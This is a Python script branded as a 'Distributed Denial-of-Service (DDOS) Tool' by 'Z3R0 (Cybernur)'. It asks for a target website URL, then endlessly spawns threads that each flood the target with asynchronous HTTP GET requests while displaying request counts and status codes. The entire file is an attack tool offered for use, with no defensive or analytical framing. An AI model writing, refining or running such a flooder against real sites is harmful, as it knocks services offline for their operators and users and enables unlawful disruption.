import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from pystyle import *
import os

# // GUI and Banner Start // #

# Header details
headers = {
    "User-Agent": "Custom-DDOS"
}

# Detecting the platform and clearing the screen accordingly
current_os = sys.platform
if current_os == "linux":
    os.system("clear")
else:
    os.system("cls")

time.sleep(1)

ascii_art = r'''
########  #######  ########    #####   
     ##  ##     ## ##     ##  ##   ##  
    ##          ## ##     ## ##     ## 
   ##     #######  ########  ##     ## 
  ##            ## ##   ##   ##     ## 
 ##      ##     ## ##    ##   ##   ##  
########  #######  ##     ##   ##### 
         Distributed Denial-of-Service (DDOS)
         Tool                            
         Please enter the target website URL below
             --Z3R0 (Cybernur)
'''

# Additional styling to the banner
banner = r"""
 """.replace('▓', '▀')
banner = Add.Add(ascii_art, banner, center=True)

# Display the banner with color
print(Colorate.Horizontal(Colors.purple_to_red, banner))

# // GUI and Banner End // #

# Initialize request counters and event loop
request_count = 0
requests_list = []
loop = asyncio.new_event_loop()
total_requests = 0

# Accepting the target URL
target_url = input("Enter Target Website URL -> ")
print()
time.sleep(1)

# Ensure the URL has a valid https protocol
if not target_url.startswith("https://"):
    target_url = "https://" + target_url.lstrip("http://")  # Removes http:// if present

print(f"Target URL: {target_url}")

# Asynchronous function to perform HTTP GET requests
async def send_request(session, target_url):
    global total_requests, requests_list
    start_time = int(time.time())
    
    while True:
        async with session.get(target_url, headers=headers) as response:
            if response:
                end_time = int(time.time())
                elapsed_time = abs(start_time - end_time)
                
                if response.status == 200:
                    total_requests += 1
                requests_list.append(response.status)
                
                # Display the request count and response status
                sys.stdout.write(f"Total Requests: {str(len(requests_list))} | Elapsed Time: {elapsed_time}s | Status Code: {str(response.status)}\r")
            else:
                print(Colorate.Horizontal(Colors.red_to_green, "[Error] No response from the server"))

# List of target URLs for the attack
url_list = [target_url]

# Main function to orchestrate the attack
async def execute_ddos():
    tasks = []
    async with aiohttp.ClientSession() as session:
        for url in url_list:
            tasks.append(send_request(session, url))
        await asyncio.gather(*tasks)

# Thread function to run the asyncio loop
def thread_task():
    loop.run_forever(asyncio.run(execute_ddos()))

# Starting the attack using multithreading
if __name__ == '__main__':
    threads = []
    while True:
        try:
            while True:
                attack_thread = threading.Thread(target=thread_task)
                try:
                    attack_thread.start()
                    threads.append(attack_thread)
                    sys.stdout.flush()
                except RuntimeError:
                    pass
        except KeyboardInterrupt:
            break